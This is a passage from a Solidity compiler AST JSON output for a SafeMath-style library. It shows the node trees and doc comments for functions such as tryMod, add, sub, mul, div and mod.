																		"referencedDeclaration": 291,
																		"src": "2560:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "%",
																	"rightExpression": {
																		"id": 310,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 293,
																		"src": "2564:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "2560:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 312,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "2553:13:2",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
																"typeString": "tuple(bool,uint256)"
															}
														},
														"functionReturnParameters": 299,
														"id": 313,
														"nodeType": "Return",
														"src": "2546:20:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 289,
										"nodeType": "StructuredDocumentation",
										"src": "2232:152:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 316,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMod",
									"nameLocation": "2399:6:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 294,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 291,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "2414:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 316,
												"src": "2406:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 290,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2406:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 293,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "2425:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 316,
												"src": "2417:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 292,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2417:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2405:22:2"
									},
									"returnParameters": {
										"id": 299,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 296,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 316,
												"src": "2451:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 295,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2451:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 298,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 316,
												"src": "2457:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 297,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2457:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2450:15:2"
									},
									"scope": 467,
									"src": "2390:195:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 330,
										"nodeType": "Block",
										"src": "2899:31:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 328,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 326,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 319,
														"src": "2917:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"id": 327,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 321,
														"src": "2921:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2917:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 325,
												"id": 329,
												"nodeType": "Return",
												"src": "2910:12:2"
											}
										]
									},
									"documentation": {
										"id": 317,
										"nodeType": "StructuredDocumentation",
										"src": "2593:233:2",
										"text": " @dev Returns the addition of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `+` operator.\n Requirements:\n - Addition cannot overflow."
									},
									"id": 331,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nameLocation": "2841:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 322,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 319,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "2853:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 331,
												"src": "2845:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 318,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2845:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 321,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "2864:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 331,
												"src": "2856:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 320,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2856:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2844:22:2"
									},
									"returnParameters": {
										"id": 325,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 324,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 331,
												"src": "2890:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 323,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2890:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "2889:9:2"
									},
									"scope": 467,
									"src": "2832:98:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 345,
										"nodeType": "Block",
										"src": "3280:31:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 343,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 341,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 334,
														"src": "3298:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"id": 342,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 336,
														"src": "3302:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3298:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 340,
												"id": 344,
												"nodeType": "Return",
												"src": "3291:12:2"
											}
										]
									},
									"documentation": {
										"id": 332,
										"nodeType": "StructuredDocumentation",
										"src": "2938:269:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 346,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nameLocation": "3222:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 337,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 334,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "3234:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 346,
												"src": "3226:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 333,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3226:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 336,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "3245:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 346,
												"src": "3237:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 335,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3237:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3225:22:2"
									},
									"returnParameters": {
										"id": 340,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 339,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 346,
												"src": "3271:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 338,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3271:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3270:9:2"
									},
									"scope": 467,
									"src": "3213:98:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 360,
										"nodeType": "Block",
										"src": "3637:31:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 358,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 356,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 349,
														"src": "3655:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"id": 357,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 351,
														"src": "3659:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3655:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 355,
												"id": 359,
												"nodeType": "Return",
												"src": "3648:12:2"
											}
										]
									},
									"documentation": {
										"id": 347,
										"nodeType": "StructuredDocumentation",
										"src": "3319:245:2",
										"text": " @dev Returns the multiplication of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `*` operator.\n Requirements:\n - Multiplication cannot overflow."
									},
									"id": 361,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nameLocation": "3579:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 352,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 349,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "3591:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 361,
												"src": "3583:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 348,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3583:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 351,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "3602:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 361,
												"src": "3594:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 350,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3594:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3582:22:2"
									},
									"returnParameters": {
										"id": 355,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 354,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 361,
												"src": "3628:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 353,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3628:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3627:9:2"
									},
									"scope": 467,
									"src": "3570:98:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 375,
										"nodeType": "Block",
										"src": "4036:31:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 373,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 371,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 364,
														"src": "4054:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 372,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 366,
														"src": "4058:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4054:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 370,
												"id": 374,
												"nodeType": "Return",
												"src": "4047:12:2"
											}
										]
									},
									"documentation": {
										"id": 362,
										"nodeType": "StructuredDocumentation",
										"src": "3676:287:2",
										"text": " @dev Returns the integer division of two unsigned integers, reverting on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator.\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 376,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nameLocation": "3978:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 367,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 364,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "3990:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 376,
												"src": "3982:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 363,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3982:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 366,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "4001:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 376,
												"src": "3993:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 365,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3993:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "3981:22:2"
									},
									"returnParameters": {
										"id": 370,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 369,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 376,
												"src": "4027:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 368,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4027:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4026:9:2"
									},
									"scope": 467,
									"src": "3969:98:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 390,
										"nodeType": "Block",
										"src": "4601:31:2",
										"statements": [
											{
												"expression": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 388,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 386,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 379,
														"src": "4619:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"id": 387,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 381,
														"src": "4623:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4619:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 385,
												"id": 389,
												"nodeType": "Return",
												"src": "4612:12:2"
											}
										]
									},
									"documentation": {
										"id": 377,
										"nodeType": "StructuredDocumentation",
										"src": "4075:453:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 391,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nameLocation": "4543:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 382,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 379,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "4555:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 391,
												"src": "4547:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 378,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4547:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 381,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "4566:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 391,
												"src": "4558:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 380,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4558:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4546:22:2"
									},
									"returnParameters": {
										"id": 385,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 384,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 391,
												"src": "4592:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 383,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4592:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "4591:9:2"
									},
									"scope": 467,
									"src": "4534:98:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 415,
										"nodeType": "Block",
										"src": "5240:111:2",
										"statements": [
											{
												"id": 414,
												"nodeType": "UncheckedBlock",
												"src": "5251:93:2",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 406,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 404,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 396,
																		"src": "5284:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "<=",
																	"rightExpression": {
																		"id": 405,
																		"name": "a",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 394,
																		"src": "5289:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "5284:6:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"id": 407,
																	"name": "errorMessage",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 398,
																	"src": "5292:12:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 403,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	4294967278,
																	4294967278
																],
																"referencedDeclaration": 4294967278,
																"src": "5276:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 408,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5276:29:2",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 409,
														"nodeType": "ExpressionStatement",
														"src": "5276:29:2"
													},
													{
														"expression": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 412,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 410,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 394,
																"src": "5327:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"id": 411,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 396,
																"src": "5331:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "5327:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"functionReturnParameters": 402,
														"id": 413,
														"nodeType": "Return",
														"src": "5320:12:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 392,
										"nodeType": "StructuredDocumentation",
										"src": "4640:465:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n overflow (when the result is negative).\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {trySub}.\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 416,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nameLocation": "5120:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 399,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 394,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "5142:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 416,
												"src": "5134:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 393,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5134:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 396,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "5162:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 416,
												"src": "5154:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 395,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5154:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 398,
												"mutability": "mutable",
												"name": "errorMessage",
												"nameLocation": "5188:12:2",
												"nodeType": "VariableDeclaration",
												"scope": 416,
												"src": "5174:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 397,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5174:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5123:84:2"
									},
									"returnParameters": {
										"id": 402,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 401,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 416,
												"src": "5231:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 400,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5231:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5230:9:2"
									},
									"scope": 467,
									"src": "5111:240:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 440,
										"nodeType": "Block",
										"src": "5978:110:2",
										"statements": [
											{
												"id": 439,
												"nodeType": "UncheckedBlock",
												"src": "5989:92:2",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 431,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 429,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 421,
																		"src": "6022:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": ">",
																	"rightExpression": {
																		"hexValue": "30",
																		"id": 430,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6026:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	},
